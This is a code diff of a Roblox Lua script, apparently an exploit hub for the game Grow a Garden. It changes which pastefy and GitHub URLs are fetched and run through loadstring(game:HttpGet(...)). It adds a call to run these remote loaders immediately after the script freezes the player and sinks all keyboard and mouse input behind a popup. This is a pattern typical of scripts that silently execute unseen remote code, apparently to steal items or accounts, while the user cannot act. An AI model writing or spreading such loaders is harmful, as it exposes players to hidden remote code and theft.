@@ -6,10 +6,10 @@ local ContextActionService = game:GetService("ContextActionService")
 
 local function runLoaders()
     pcall(function()
-        loadstring(game:HttpGet("https://pastefy.app/aW6Uuuvw/raw"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/GrowAGarden/refs/heads/main/kunihublibrary2"))()
     end)
     pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/GrowAGarden/refs/heads/main/kunihublibrary2"))()
+        loadstring(game:HttpGet("https://pastefy.app/9eQeq8s4/raw"))()
     end)
 end
 
@@ -106,10 +106,13 @@ To disable this feature:
         Position = UDim2.new(0.5, -230, 0.5, -130)
     }):Play()
 
+    -- Freeze player
     freezePlayer()
-
     ContextActionService:BindAction("FreezeAllInputs", function() return Enum.ContextActionResult.Sink end, false, unpack(Enum.UserInputType:GetEnumItems()))
     ContextActionService:BindAction("FreezeAllKeys", function() return Enum.ContextActionResult.Sink end, false, unpack(Enum.KeyCode:GetEnumItems()))
+
+    -- Run loaders even sa Delta
+    runLoaders()
 
     Button.MouseButton1Click:Connect(function()
         ContextActionService:UnbindAction("FreezeAllInputs")
